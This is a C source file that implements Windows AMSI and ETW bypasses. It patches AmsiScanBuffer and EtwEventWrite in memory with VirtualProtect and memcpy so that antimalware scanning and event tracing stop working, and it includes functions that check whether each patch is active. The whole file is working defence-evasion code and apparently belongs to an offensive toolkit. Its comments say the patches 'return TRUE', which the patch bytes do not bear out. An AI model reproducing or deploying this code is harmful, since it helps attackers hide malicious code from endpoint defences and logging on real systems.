/**
 * @file amsi.c
 * @brief AMSI and ETW bypass implementation
 */

#include "amsi.h"

#ifdef _WIN32
#include <windows.h>
#include <stdio.h>

/* AMSI bypass opcodes (return TRUE) */
static const unsigned char amsi_patch[] = {
    0xB8, 0x57, 0x00, 0x07, 0x80,  /* mov eax, 0x80070057 (E_INVALIDARG) */
    0xC3                           /* ret */
};

/* ETW bypass opcodes (return TRUE) */
static const unsigned char etw_patch[] = {
    0xC3                           /* ret */
};

/**
 * @brief Patch function in memory
 * 
 * @param func_name Function name to patch
 * @param module_name Module name containing function
 * @param patch Patch bytes
 * @param patch_size Patch size
 * @return int 0 on success, -1 on failure
 */
static int patch_function(const char *func_name, const char *module_name, const unsigned char *patch, size_t patch_size) {
    HMODULE hModule = GetModuleHandleA(module_name);
    if (!hModule) {
        hModule = LoadLibraryA(module_name);
        if (!hModule) {
            return -1;
        }
    }
    
    FARPROC func_addr = GetProcAddress(hModule, func_name);
    if (!func_addr) {
        return -1;
    }
    
    DWORD old_protect;
    if (!VirtualProtect(func_addr, patch_size, PAGE_EXECUTE_READWRITE, &old_protect)) {
        return -1;
    }
    
    memcpy(func_addr, patch, patch_size);
    
    VirtualProtect(func_addr, patch_size, old_protect, &old_protect);
    
    /* Flush instruction cache */
    FlushInstructionCache(GetCurrentProcess(), func_addr, patch_size);
    
    return 0;
}

int amsi_bypass(void) {
    /* Patch AmsiScanBuffer in amsi.dll */
    return patch_function("AmsiScanBuffer", "amsi.dll", amsi_patch, sizeof(amsi_patch));
}

int etw_bypass(void) {
    /* Patch EtwEventWrite in ntdll.dll */
    return patch_function("EtwEventWrite", "ntdll.dll", etw_patch, sizeof(etw_patch));
}

bool amsi_is_active(void) {
    HMODULE hModule = GetModuleHandleA("amsi.dll");
    if (!hModule) {
        return false;
    }
    
    FARPROC func_addr = GetProcAddress(hModule, "AmsiScanBuffer");
    if (!func_addr) {
        return false;
    }
    
    /* Check if function is patched */
    unsigned char first_byte = *(unsigned char *)func_addr;
    return (first_byte != 0xB8 && first_byte != 0xC3);
}

bool etw_is_active(void) {
    HMODULE hModule = GetModuleHandleA("ntdll.dll");
    if (!hModule) {
        return false;
    }
    
    FARPROC func_addr = GetProcAddress(hModule, "EtwEventWrite");
    if (!func_addr) {
        return false;
    }
    
    /* Check if function is patched */
    unsigned char first_byte = *(unsigned char *)func_addr;
    return (first_byte != 0xC3);
}

#else /* Linux/macOS stubs */

int amsi_bypass(void) {
    return 0; /* Not applicable */
}

int etw_bypass(void) {
    return 0; /* Not applicable */
}

bool amsi_is_active(void) {
    return false;
}

bool etw_is_active(void) {
    return false;
}

#endif
